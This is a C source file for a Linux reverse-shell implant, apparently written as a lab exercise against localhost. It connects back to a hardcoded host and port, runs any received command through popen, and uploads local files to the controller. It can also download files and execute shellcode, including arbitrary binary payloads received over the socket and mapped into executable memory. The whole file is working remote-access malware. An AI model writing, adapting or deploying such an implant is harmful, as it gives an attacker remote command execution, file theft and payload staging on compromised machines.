#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define HOST "127.0.0.1"
#define PORT 5555
#define BUFFER_SIZE 4096

// ROCK-SOLID LINEAR x86_64 AUTOMATED FORRENSICS PAYLOAD
// 1. Openat() -> Creates/opens 'rensics_oof.txt' locally
// 2. Write()  -> Writes text string '[+] WRITN_BY_ASM\n' into the file
// 3. Write()  -> Safely outputs 'orld!\n' directly to standard stdout
// 4. Returns smoothly to the C engine loop via 'ret' (c3) with 100% stability
unsigned char automated_shellcode[] = {
    0x55, 0x48, 0x89, 0xe5, 0x48, 0x31, 0xc0, 0x99, 0x52, 0x48, 0xba, 0x6f, 
    0x6f, 0x66, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x52, 0x48, 0xba, 0x72, 0x65, 
    0x6e, 0x73, 0x69, 0x63, 0x73, 0x5f, 0x52, 0x48, 0x89, 0xe7, 0x66, 0xbe, 
    0x42, 0x01, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 
    0x89, 0xc7, 0x48, 0x31, 0xc0, 0x50, 0x48, 0xba, 0x5f, 0x42, 0x59, 0x5f, 
    0x41, 0x53, 0x4d, 0x0a, 0x52, 0x48, 0xba, 0x5b, 0x2b, 0x5d, 0x20, 0x57, 
    0x52, 0x49, 0x54, 0x4e, 0x48, 0x89, 0xe6, 0xba, 0x10, 0x00, 0x00, 0x00, 
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc7, 
    0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc0, 0x50, 0x48, 0xba, 0x6f, 0x72, 
    0x6c, 0x64, 0x21, 0x0a, 0x00, 0x00, 0x52, 0x48, 0xba, 0x48, 0x65, 0x6c, 
    0x6c, 0x6f, 0x20, 0x57, 0x5f, 0x48, 0x89, 0xe6, 0xba, 0x0f, 0x00, 0x00, 
    0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc9, 0xc3
};

void client_recv_stream(int sock, char *file_name) {
    char size_str[32];
    memset(size_str, 0, sizeof(size_str));
    recv(sock, size_str, sizeof(size_str), 0);
    if (strstr(size_str, "ERROR") != NULL) return;

    long file_size = atol(size_str);
    FILE *f = fopen(file_name, "wb");
    if (!f) return;

    char buffer[BUFFER_SIZE];
    long bytes_received = 0;
    while (bytes_received < file_size) {
        long remaining = file_size - bytes_received;
        long chunk_to_read = (remaining < BUFFER_SIZE) ? remaining : BUFFER_SIZE;
        int read_len = recv(sock, buffer, chunk_to_read, 0);
        if (read_len <= 0) break;

        fwrite(buffer, 1, read_len, f);
        bytes_received += read_len;
    }
    fclose(f);
}

void client_send_stream(int sock, char *file_name) {
    FILE *f = fopen(file_name, "rb");
    if (!f) {
        send(sock, "[-] ERROR: Local target file not found.", 36, 0);
        return;
    }

    struct stat st;
    stat(file_name, &st);
    long file_size = st.st_size;

    char size_str[32];
    sprintf(size_str, "%ld", file_size);
    send(sock, size_str, sizeof(size_str), 0);
    usleep(100000);

    char buffer[BUFFER_SIZE];
    long bytes_sent = 0;
    while (bytes_sent < file_size) {
        int read_len = fread(buffer, 1, BUFFER_SIZE, f);
        send(sock, buffer, read_len, 0);
        bytes_sent += read_len;
    }
    fclose(f);
}

void hex_to_bytes(const char *hex, unsigned char *bytes) {
    size_t len = strlen(hex);
    for (size_t i = 0; i < len; i += 2) {
        sscanf(&hex[i], "%2hhx", &bytes[i / 2]);
    }
}

void execute_automated_injection(int sock) {
    void *exec_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, 
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        send(sock, "[-] Automated mmap page allocation failure.", 39, 0);
        return;
    }

    // Move the pristine, position-independent machine bytes cleanly into memory
    memcpy(exec_mem, automated_shellcode, sizeof(automated_shellcode));

    char tracking_alert[128];
    sprintf(tracking_alert, "[+] Automated File-Writer Shellcode active at: %p", exec_mem);
    send(sock, tracking_alert, strlen(tracking_alert) + 1, 0);
    usleep(50000);

    // Context Jump: Shift CPU instruction pointer straight to the page address
    void (*shellcode_func)() = (void (*)())exec_mem;
    shellcode_func();
}

void execute_raw_binary_injection(int sock) {
    char size_str[32];
    memset(size_str, 0, sizeof(size_str));
    
    recv(sock, size_str, sizeof(size_str), 0);
    if (strcmp(size_str, "ERROR") == 0) return;
    
    long bin_size = atol(size_str);

    void *exec_mem = mmap(NULL, bin_size > 4096 ? bin_size : 4096, 
                          PROT_READ | PROT_WRITE | PROT_EXEC, 
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        send(sock, "[-] Kernel memory mapping failed.", 33, 0);
        return;
    }

    long bytes_received = 0;
    unsigned char *exec_ptr = (unsigned char *)exec_mem;
    while (bytes_received < bin_size) {
        long remaining = bin_size - bytes_received;
        long chunk_to_read = (remaining < BUFFER_SIZE) ? remaining : BUFFER_SIZE;
        int read_len = recv(sock, exec_ptr + bytes_received, chunk_to_read, 0);
        if (read_len <= 0) break;
        bytes_received += read_len;
    }

    char tracking_alert[128];
    sprintf(tracking_alert, "[+] Staged Binary Payload executed safely at pointer: %p", exec_mem);
    send(sock, tracking_alert, strlen(tracking_alert) + 1, 0);
    usleep(50000);

    void (*shellcode_func)() = (void (*)())exec_mem;
    shellcode_func();
}

void shell(int sock) {
    char command[BUFFER_SIZE];
    char response[BUFFER_SIZE * 2];

    while (1) {
        memset(command, 0, sizeof(command));
        int bytes_read = recv(sock, command, sizeof(command) - 1, 0);
        if (bytes_read <= 0) break;

        command[strcspn(command, "\r\n")] = 0;

        if (strcmp(command, "quit") == 0) break;

        else if (strcmp(command, "shellcode-demo") == 0) {
            execute_automated_injection(sock);
        }
        else if (strncmp(command, "cd ", 3) == 0) {
            char *path = command + 3;
            if (chdir(path) == 0) {
                char cwd[BUFFER_SIZE];
                getcwd(cwd, sizeof(cwd));
                sprintf(response, "[+] Directory changed: %s", cwd);
            } else {
                sprintf(response, "[-] Failed to change directory.");
            }
            send(sock, response, strlen(response) + 1, 0);
        }
        else if (strncmp(command, "download ", 9) == 0) {
            client_recv_stream(sock, command + 9);
        }
        else if (strncmp(command, "upload ", 7) == 0) {
            client_send_stream(sock, command + 7);
        }
        else if (strcmp(command, "inject-custom") == 0) {
            execute_raw_binary_injection(sock);
        }
        else {
            FILE *fp = popen(command, "r");
            if (fp == NULL) {
                send(sock, "[-] Execution crash.", 21, 0);
                continue;
            }
            memset(response, 0, sizeof(response));
            size_t total_read = 0;
            size_t current_read;
            while ((current_read = fread(response + total_read, 1, BUFFER_SIZE, fp)) > 0) {
                total_read += current_read;
                if (total_read >= sizeof(response) - BUFFER_SIZE) break;
            }
            pclose(fp);

            if (strlen(response) == 0) {
                strcpy(response, "[+] Command completed with no output.");
            }
            send(sock, response, strlen(response) + 1, 0);
        }
    }
}

int main() {
    int sock;
    struct sockaddr_in server_addr;

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = inet_addr(HOST);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            shell(sock);
            close(sock);
            break;
        }
        close(sock);
        sleep(2);
    }
    return 0;
}
